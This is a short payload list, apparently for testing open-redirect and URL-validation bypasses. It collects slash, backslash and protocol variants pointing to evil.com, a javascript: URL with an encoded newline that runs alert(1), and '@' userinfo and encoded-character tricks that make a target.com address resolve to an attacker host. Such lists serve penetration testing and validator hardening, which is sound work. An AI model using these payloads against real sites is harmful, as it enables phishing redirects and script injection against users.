# ---- Protocol Tricks ----

http://evil.com
//evil.com
///evil.com
////evil.com
/\evil.com
\/evil.com
javascript://evil.com%0aalert(1)

# ---- @ Trick ----
https://target.com@evil.com
https://target.com:pass@evil.com

@evil.com
https://@evil.com

https://target.com%60.evil.com
